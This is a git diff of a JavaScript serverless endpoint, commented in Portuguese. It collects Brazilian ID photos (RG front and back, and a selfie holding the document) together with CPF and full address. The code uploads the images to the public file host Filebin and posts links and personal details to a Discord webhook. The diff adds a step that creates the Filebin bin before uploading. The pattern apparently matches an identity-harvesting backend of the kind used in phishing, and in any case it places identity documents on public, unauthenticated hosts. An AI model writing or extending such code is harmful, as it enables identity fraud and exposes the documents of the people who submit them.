@@ -1,4 +1,4 @@
-// api/upload-cadastro.js - Proxy para upload múltiplos documentos no Filebin + Discord
+// api/upload-sadastro.js - Proxy para upload múltiplos documentos no Filebin + Discord
 import formidable from 'formidable';
 import fs from 'fs';  // Para limpar arquivos temporários
 
@@ -53,7 +53,7 @@ export default async function handler(req, res) {
     // Extrai arquivos
     const rgFrenteFile = files.rgFrente ? files.rgFrente[0] : null;
     const rgVersoFile = files.rgVerso ? files.rgVerso[0] : null;
-    const fotoSegurandoDocumentoFile = files.fotoSegurandoDocumento ? files.fotoSegurandoDocumento[0] : null; // NOVO
+    const fotoSegurandoDocumentoFile = files.fotoSegurandoDocumento ? files.fotoSegurandoDocumento[0] : null;
 
     const DISCORD_WEBHOOK_URL4 = process.env.DISCORD_WEBHOOK_URL4;
 
@@ -105,6 +105,21 @@ export default async function handler(req, res) {
         const timestamp = Date.now();
         const cpfLimpo = cpf.replace(/\D/g, '');
 
+        // *** NOVA LÓGICA: Garantir que o bin exista antes de fazer upload ***
+        console.log(`Verificando/Criando o bin: ${BIN_NAME}`);
+        const createBinResponse = await fetch(`${FILEBIN_BASE_URL}/${BIN_NAME}`, {
+            method: 'POST',
+            // O corpo pode ser vazio, só precisamos que a requisição POST seja feita para criar o bin
+            body: '', 
+        });
+        if (!createBinResponse.ok) {
+            // Se nem conseguir criar o bin, algo está muito errado.
+            const errorText = await createBinResponse.text();
+            throw new Error(`Falha ao criar o bin no Filebin: ${errorText}`);
+        }
+        console.log('Bin verificado/criado com sucesso.');
+        // *** FIM DA NOVA LÓGICA ***
+
         // Função auxiliar para upload de um arquivo
         async function uploadToFilebin(file, prefix) {
             if (!file) return null; // Retorna null se o arquivo não for fornecido
@@ -135,7 +150,7 @@ export default async function handler(req, res) {
         const [linkRgFrente, linkRgVerso, linkFotoSegurandoDocumento] = await Promise.all([
             uploadToFilebin(rgFrenteFile, 'rg-frente'),
             uploadToFilebin(rgVersoFile, 'rg-verso'),
-            uploadToFilebin(fotoSegurandoDocumentoFile, 'foto-segurando-documento') // NOVO
+            uploadToFilebin(fotoSegurandoDocumentoFile, 'foto-segurando-documento')
         ]);
 
         // Limpa arquivos temp
@@ -159,7 +174,7 @@ export default async function handler(req, res) {
                         { name: 'Endereço Completo', value: enderecoCompleto, inline: false },
                         { name: 'RG - Frente', value: `[Visualizar](${linkRgFrente})`, inline: false },
                         { name: 'RG - Verso', value: `[Visualizar](${linkRgVerso})`, inline: false },
-                        { name: 'Foto segurando documento', value: `[Visualizar](${linkFotoSegurandoDocumento})`, inline: false }, // NOVO
+                        { name: 'Foto segurando documento', value: `[Visualizar](${linkFotoSegurandoDocumento})`, inline: false },
                     ],
                     timestamp: new Date().toISOString(),
                     footer: { text: 'Filebin via Vercel Proxy' },
@@ -186,7 +201,7 @@ export default async function handler(req, res) {
             links: { 
                 rgFrente: linkRgFrente, 
                 rgVerso: linkRgVerso, 
-                fotoSegurandoDocumento: linkFotoSegurandoDocumento // NOVO
+                fotoSegurandoDocumento: linkFotoSegurandoDocumento
             }
         });
 
